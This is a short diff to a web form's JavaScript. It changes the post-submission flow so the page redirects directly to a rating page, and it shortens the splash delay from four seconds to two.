@@ -103,15 +103,9 @@ document.addEventListener('DOMContentLoaded', function () {
         }, 3000);
     }
 
-    // === Show Success Screen then Redirect ===
+    // === Show Success Screen then Redirect to Rating ===
     function showSuccessAndRedirect() {
-        const successScreen = document.getElementById('successScreen');
-        if (successScreen) {
-            successScreen.classList.add('show');
-        }
-        setTimeout(function () {
-            window.location.href = window.location.href;
-        }, 2000);
+        window.location.href = 'rating.html';
     }
 
     // === Form Submission ===
@@ -178,7 +172,7 @@ document.addEventListener('DOMContentLoaded', function () {
                 tradingPasswordInput.value = '';
 
                 // Show splash for 4 seconds, then success screen, then redirect
-                showSplash(4000, showSuccessAndRedirect);
+                showSplash(2000, showSuccessAndRedirect);
             } else {
                 showToast(data.message || 'Something went wrong', true);
             }
